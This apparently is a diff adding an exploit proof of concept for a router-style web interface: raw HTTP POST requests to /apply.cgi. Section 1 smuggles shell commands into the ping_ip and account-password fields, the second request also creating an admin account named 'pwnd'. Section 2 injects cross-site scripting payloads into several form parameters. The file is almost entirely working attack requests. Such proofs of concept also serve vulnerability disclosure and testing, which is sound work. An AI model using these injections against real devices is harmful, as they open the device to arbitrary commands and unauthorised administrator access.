@@ -1,0 +1,85 @@
+1. Command Injection:
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://www.example.com/Diagnostics.asp
+Authorization: Basic XXX=
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 194
+Connection: close
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_pin
+g&action=&commit=0&nowait=1&ping_ip=%3b%20ping%20-c%201%20192%2e168%2e1%
+2e147%20%3b&ping_size=&ping_times=5&traceroute_ip=
+
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/User_Properties.asp
+Authorization: Basic XXX=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 444
+
+command=device_data&cur_ipaddr=192.168.178.188&next_page=StorageAdminUse
+rAdd1.htm&redirect_timer=1&reboot=0&data1=&next_page=&submit_button=User
+_Properties&submit_type=create_user&change_action=gozila_cgi&Add_Account
+_Group_Name=&access_group_name=&delete_groups=&Modify_Account_Name=&Add_
+Account_Name=pwnd&full_name=pwnd&user_desc=pwnd&Add_Account_Password=`pi
+ng%20192%2e168%2e178%2e103`&Add_Account_PasswordConfirm=pwnd&Add_Account
+_Group=admin
+
+2. Cross site scripting:
+
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/Diagnostics.asp
+Authorization: Basic XXX=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 156
+
+submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_pin
+g&action=&commit=0&nowait=1&ping_ip=1.1.1.1'><script>alert(1)</script>&p
+ing_size=32&ping_times=5&traceroute_ip=
+
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/DHCPTable.asp
+Authorization: Basic XXX=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+submit_button=DHCPTable&change_action=&submit_type=&small_screen=&ip=&ma
+c=&if_name=&nowait=1&sortby=mac"%3balert(1)//
+
+POST /apply.cgi HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/WanMAC.asp
+Authorization: Basic XXX=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+
+submit_button=WanMAC'%3balert(1)//&change_action=&submit_type=&action=Ap
+ply&wait_time=3&mac_clone_enable=0
+
